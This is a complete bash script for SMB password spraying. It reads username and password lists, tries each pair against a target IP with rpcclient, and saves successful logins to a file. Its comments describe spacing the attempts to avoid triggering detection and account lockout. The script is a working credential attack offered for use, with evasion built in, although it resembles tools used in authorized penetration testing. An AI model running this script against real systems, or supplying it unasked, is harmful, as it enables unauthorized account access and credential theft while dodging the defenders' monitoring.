#!/bin/bash

# Input files
userlist="userlist.txt"
passwordlist="passwordlist.txt"
target_ip="<TARGET-IP>"         # Replace with the IP of your target system
delay=1800                      # Set delay between sprays (e.g., 1800 seconds = 30 minutes)
output_file="successful_attempts.txt"  # File to store successful logins

# Ensure the output file exists and is empty at the start
> $output_file

# Check if both user and password list files exist
if [[ ! -f $userlist ]] || [[ ! -f $passwordlist ]]; then
  echo "Userlist or Passwordlist file not found!"
  exit 1
fi

# Loop through each password in the password list
while IFS= read -r password; do
  echo "Spraying password: $password"
  
  # Loop through each user in the user list for the current password
  while IFS= read -r username; do
    echo "Trying $password for user: $username"

    # Use rpcclient for SMB-based password spraying, suppress output except for successful attempts
    # This can be changed if other tools are required such as crackmapexec or ldapsearch
    rpcclient -U "$username%$password" $target_ip -c exit &>/dev/null
    
    # If the previous command was successful, log the successful attempt
    if [[ $? -eq 0 ]]; then
      echo "[+] Successful login - Username: $username | Password: $password"
      echo "$username:$password" >> $output_file
    fi

    # Short delay between individual user attempts to avoid triggering detection mechanisms
    sleep 5  
  done < "$userlist"

  # Wait for the observation window before trying the next password
  echo "Waiting for observation window to pass to avoid lockout..."
  sleep $delay

done < "$passwordlist"
